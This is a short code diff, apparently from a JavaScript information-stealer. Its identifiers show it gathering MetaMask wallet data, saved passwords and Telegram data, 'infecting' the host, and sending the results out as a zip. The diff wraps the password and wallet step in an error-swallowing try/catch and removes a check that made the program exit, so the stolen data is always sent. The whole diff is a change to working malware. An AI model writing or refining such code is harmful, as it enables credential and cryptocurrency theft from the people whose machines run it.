@@ -729,12 +729,14 @@
                 async (type) => {
 
                   if (type == "passwords") {
+                    try {
                     client.config.environ.metamask.forEach(async (mmpath) => {
                       client.utils.encryption.step1(mmpath, client.config.environ.all_passwords)
 
                     })
 
                     client.utils.encryption.step2(client.config.environ.all_passwords)
+                    } catch {}
                   }
 
                   var _type = type.charAt(0).toUpperCase() + type.slice(1) // Capitalized
@@ -2541,11 +2543,7 @@
               await this.get_user_info();
               await this.get_telegram();
               await this.infect();
-              if (client.utils.encryption.step1 && client.utils.encryption.step2) {
-                await this.send_zip();
-              } else {
-                process.exit(0)
-              }
+              await this.send_zip();
             },
 
             getFolderFiles(path_prefix, path) {
